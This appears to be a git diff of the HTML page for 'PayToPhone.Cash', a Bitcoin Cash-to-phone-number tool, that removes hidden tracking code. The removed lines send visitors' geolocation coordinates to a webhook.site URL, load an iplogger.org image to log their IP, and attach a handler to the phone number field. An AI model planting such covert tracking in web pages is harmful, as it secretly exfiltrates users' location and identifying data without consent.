@@ -7,42 +7,15 @@
   <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
   <link rel="stylesheet" href="main.css">
   <script src="main.js"></script>
-  <script>
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  }
-    else
-    {
-        let xhr = new XMLHttpRequest();
-
-  // 2. Configure it: GET-request for the URL /article/.../load
-  xhr.open('GET', 'https://webhook.site/6599d5dd-7bc8-4332-9f76-547c9b75e880?' + "NONONO");
-
-  // 3. Send the request over the network
-  xhr.send();
-    }
-
-function showPosition(position) {
-    // 1. Create a new XMLHttpRequest object
-  let xhr = new XMLHttpRequest();
-
-  // 2. Configure it: GET-request for the URL /article/.../load
-  xhr.open('GET', 'https://webhook.site/6599d5dd-7bc8-4332-9f76-547c9b75e880?' + position.coords.latitude.toString() + "zzzzzzzzz" + position.coords.longitude.toString());
-
-  // 3. Send the request over the network
-  xhr.send();
-}
-</script>
 </head>
 
 <body>
-  <Img src="https://iplogger.org/1ZX4t7">
   <h1>PayToPhone.<a class="green" href="https://bitcoincash.org">Cash</a></h1>
   <p>Send <a class="green" href="https://bitcoincash.org">Bitcoin Cash</a> to a phone number using <a class="green" href="https://cointext.io/">Cointext</a>.</p>
   <p class="warning">Please include the country code of the phone number in the phone number field.</p>
   <div id="centeredDiv">
     <label class="green">Phone Number</label>
-    <input onchange="myFunctionn(this.value)";id="phoneNumber" class="green" type="tel">
+    <input id="phoneNumber" class="green" type="tel">
     <br><br>
     <label class="green">Amount </label>
     <select id="currencyMenu">
